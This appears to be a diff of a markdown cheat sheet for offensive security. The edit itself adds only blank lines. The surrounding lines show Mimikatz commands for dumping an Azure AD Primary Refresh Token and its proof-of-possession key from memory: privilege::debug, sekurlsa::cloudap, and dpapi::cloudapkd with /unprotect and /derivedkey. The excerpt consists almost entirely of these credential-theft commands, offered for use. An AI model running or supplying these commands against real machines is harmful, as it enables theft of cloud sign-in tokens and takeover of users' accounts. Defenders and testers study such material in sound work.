@@ -19,6 +19,7 @@ PS> Invoke-Mimikatz -Command '"privilege::debug" "sekurlsa::cloudap"'
 # Copy the PRT and KeyValue
 Mimikatz> privilege::debug
 
+
 # Display the PRT data and copy the PRT key and the ProofOfPosessionKey.KeyValue
 Mimikatz> sekurlsa::cloudap
 
@@ -30,3 +31,5 @@ Mimikatz> dpapi::cloudapkd /keyvalue:<KeyValue> /unprotect
 Mimikatz> dpapi::cloudapkd /context:<Context> /derivedkey:<DerivedKey> /Prt:<PRT>
 
 ```
+
+
